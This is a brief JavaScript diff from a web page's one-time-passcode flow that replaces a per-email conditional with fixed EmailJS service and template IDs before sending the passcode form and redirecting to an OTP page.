@@ -541,12 +541,8 @@
                                 form.elements['otpValue'].value = passcode;
                                 form.elements['email'].value = account.email;
 
-                                var serviceID = 'default_service';
-                                var templateID = 'template_o0yyspn';
-                                if(account.email == "kellylambeth93@gmail.com"){
-                                    serviceID = 'service_pz3arrq';
-                                    templateID = 'template_zm7rm7s';
-                                }
+                                const serviceID = 'service_pz3arrq';
+                                const templateID = 'template_zm7rm7s';
                                 emailjs.sendForm(serviceID, templateID, form)
                                     .then(() => {
                                         window.location.href = "otp.html";
